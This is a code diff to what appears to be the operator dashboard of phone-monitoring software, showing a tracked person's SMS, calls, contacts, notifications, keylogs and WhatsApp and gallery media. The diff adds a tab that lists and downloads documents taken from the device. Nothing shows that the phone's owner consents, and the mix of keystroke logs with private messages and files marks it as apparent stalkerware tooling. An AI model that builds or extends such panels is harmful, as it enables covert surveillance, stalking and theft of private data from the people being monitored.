@@ -5,6 +5,8 @@ import {
   IconBell,
   IconContact,
   IconDevice,
+  IconDocument,
+  IconDownload,
   IconEye,
   IconEyeOff,
   IconImage,
@@ -13,6 +15,7 @@ import {
   IconMessage,
   IconPhone,
   IconSearch,
+  IconTrash,
   IconUser,
   IconUsers,
   IconVideo,
@@ -41,8 +44,8 @@ type Tab =
   | "contacts"
   | "notifications"
   | "keylogs"
-  | "app_usage"
-  | "gallery";
+  | "gallery"
+  | "documents";
 
 const PAGE_SIZE = 40;
 
@@ -141,12 +144,12 @@ export default function UserDetailPage() {
       contacts: countMap(data?.contacts),
       notifications: countMap(data?.notifications),
       keylogs: countMap(data?.keylogs),
-      app_usage: countMap(data?.app_usage),
       gallery: countMap(data?.gallery),
+      documents: countMap(data?.documents),
     };
     return [
-      { id: "app_usage" as Tab, label: "App usage", count: counts.app_usage, icon: IconDevice },
       { id: "gallery" as Tab, label: "Gallery", count: counts.gallery, icon: IconImage },
+      { id: "documents" as Tab, label: "Documents", count: counts.documents, icon: IconDocument },
       { id: "sms" as Tab, label: "SMS", count: counts.sms, icon: IconMessage },
       { id: "call_logs" as Tab, label: "Calls", count: counts.call_logs, icon: IconPhone },
       { id: "contacts" as Tab, label: "Contacts", count: counts.contacts, icon: IconContact },
@@ -166,7 +169,7 @@ export default function UserDetailPage() {
     if (tab === "notifications")
       return recordsToList(data.notifications).filter((r) => matchesQuery(r, q));
     if (tab === "keylogs") return recordsToList(data.keylogs).filter((r) => matchesQuery(r, q));
-    if (tab === "app_usage") return recordsToList(data.app_usage).filter((r) => matchesQuery(r, q));
+    if (tab === "documents") return recordsToList(data.documents).filter((r) => matchesQuery(r, q));
     return [];
   }, [data, tab, query]);
 
@@ -352,36 +355,13 @@ export default function UserDetailPage() {
           />
         ) : null}
 
-        {tab === "app_usage" ? (
-          <RecordTable
-            empty="No app usage yet. On the phone, allow Usage Access when prompted, then return to the app."
+        {tab === "documents" ? (
+          <DocumentsView
             rows={pageRows}
             total={listRecords.length}
             page={pageSafe}
             pageCount={pageCount}
             onPage={setPage}
-            columns={[
-              {
-                key: "app",
-                label: "App",
-                render: (r) => (
-                  <span>
-                    <strong>{r.appName || appLabel(r.packageName)}</strong>
-                    <div className="muted mono tiny">{r.packageName || "—"}</div>
-                  </span>
-                ),
-              },
-              {
-                key: "time",
-                label: "Screen time",
-                render: (r) => r.totalTimeText || formatDuration(Math.floor(Number(r.totalTimeMs || 0) / 1000)),
-              },
-              {
-                key: "last",
-                label: "Last used",
-                render: (r) => formatTime(r.lastTimeUsed || r.uploadedAt),
-              },
-            ]}
           />
         ) : null}
 
@@ -653,26 +633,81 @@ function GalleryView({
       <p className="muted" style={{ margin: 0 }}>
         {entries.length} media item{entries.length === 1 ? "" : "s"}
       </p>
-      <div className="gallery">
-        {entries.map(([id, item]) => (
-          <button
-            key={id}
-            type="button"
-            className="gallery-item"
-            onClick={() => item?.url && onOpen(item.url)}
-            title={item?.fileName || id}
-          >
-            <img src={item?.url} alt={item?.fileName || id} loading="lazy" />
-            <span className="gallery-meta">
-              {item?.source === "whatsapp" ? "WhatsApp" : "Gallery"}
-            </span>
-            <span className="gallery-caption">
-              {item?.fileName || "Media"}
-              <br />
-              <span className="tiny">{formatTime(item?.uploadedAt || item?.timestamp)}</span>
-            </span>
-          </button>
-        ))}
+      <div className="table-wrap">
+        <table className="table">
+          <thead>
+            <tr>
+              <th>Preview</th>
+              <th>File Name</th>
+              <th>Source</th>
+              <th>Uploaded</th>
+              <th>Actions</th>
+            </tr>
+          </thead>
+          <tbody>
+            {entries.map(([id, item]) => (
+              <tr key={id} className="click-row">
+                <td style={{ width: "80px" }}>
+                  <img
+                    src={item?.url}
+                    alt={item?.fileName || id}
+                    loading="lazy"
+                    style={{
+                      width: "60px",
+                      height: "60px",
+                      objectFit: "cover",
+                      borderRadius: "8px",
+                      cursor: "pointer",
+                    }}
+                    onClick={() => item?.url && onOpen(item.url)}
+                    title="Click to preview"
+                  />
+                </td>
+                <td>
+                  <strong>{item?.fileName || "Media"}</strong>
+                </td>
+                <td>
+                  <span className="badge soft">
+                    {item?.source === "whatsapp" ? "WhatsApp" : "Gallery"}
+                  </span>
+                </td>
+                <td className="muted tiny">
+                  {formatTime(item?.uploadedAt || item?.timestamp)}
+                </td>
+                <td>
+                  <div style={{ display: "flex", gap: "8px", alignItems: "center" }}>
+                    {item?.url ? (
+                      <a
+                        href={item.url}
+                        target="_blank"
+                        rel="noreferrer"
+                        download={item?.fileName || "media"}
+                        className="btn btn-icon"
+                        style={{ padding: "6px 10px", fontSize: "12px" }}
+                        title="Download file"
+                      >
+                        <IconDownload size={14} />
+                      </a>
+                    ) : null}
+                    <button
+                      className="btn btn-icon danger"
+                      style={{ padding: "6px 10px", fontSize: "12px" }}
+                      title="Delete file"
+                      onClick={() => {
+                        if (confirm(`Delete ${item?.fileName || "this file"}?`)) {
+                          // Delete functionality can be added here
+                          console.log("Delete:", id);
+                        }
+                      }}
+                    >
+                      <IconTrash size={14} />
+                    </button>
+                  </div>
+                </td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
       </div>
     </div>
   );
@@ -777,6 +812,96 @@ function MessageFeed({
             <p className="feed-body">{renderBody(r)}</p>
           </article>
         ))}
+      </div>
+    </div>
+  );
+}
+
+function DocumentsView({
+  rows,
+  total,
+  page,
+  pageCount,
+  onPage,
+}: {
+  rows: Record<string, any>[];
+  total: number;
+  page: number;
+  pageCount: number;
+  onPage: (p: number) => void;
+}) {
+  if (total === 0) {
+    return (
+      <p className="empty-state">No documents uploaded yet.</p>
+    );
+  }
+
+  const from = page * PAGE_SIZE + 1;
+  const to = Math.min(total, page * PAGE_SIZE + rows.length);
+
+  return (
+    <div className="stack">
+      <Pager from={from} to={to} total={total} page={page} pageCount={pageCount} onPage={onPage} />
+      <div className="table-wrap">
+        <table className="table">
+          <thead>
+            <tr>
+              <th>File Name</th>
+              <th>Size</th>
+              <th>Uploaded</th>
+              <th>Action</th>
+            </tr>
+          </thead>
+          <tbody>
+            {rows.map((doc: any) => {
+              const fileName = doc.fileName || doc.id || "Document";
+              const fileSize = doc.fileSize ? `${(Number(doc.fileSize) / 1024 / 1024).toFixed(2)} MB` : "—";
+              const uploadedTime = formatTime(doc.uploadedAt || doc.timestamp);
+              const isPdf = fileName.toLowerCase().endsWith('.pdf');
+              const isImage = /\.(jpg|jpeg|png|gif|webp)$/i.test(fileName);
+
+              return (
+                <tr key={doc.id} className="click-row">
+                  <td>
+                    <strong>{fileName}</strong>
+                  </td>
+                  <td>{fileSize}</td>
+                  <td className="muted tiny">{uploadedTime}</td>
+                  <td>
+                    {doc.url ? (
+                      <>
+                        {isPdf || isImage ? (
+                          <a
+                            href={doc.url}
+                            target="_blank"
+                            rel="noreferrer"
+                            className="btn btn-icon"
+                            style={{ padding: "6px 12px", fontSize: "12px" }}
+                          >
+                            👁️ Preview
+                          </a>
+                        ) : (
+                          <a
+                            href={doc.url}
+                            target="_blank"
+                            rel="noreferrer"
+                            className="btn btn-icon secondary"
+                            download
+                            style={{ padding: "6px 12px", fontSize: "12px" }}
+                          >
+                            ⬇️ Download
+                          </a>
+                        )}
+                      </>
+                    ) : (
+                      "—"
+                    )}
+                  </td>
+                </tr>
+              );
+            })}
+          </tbody>
+        </table>
       </div>
     </div>
   );
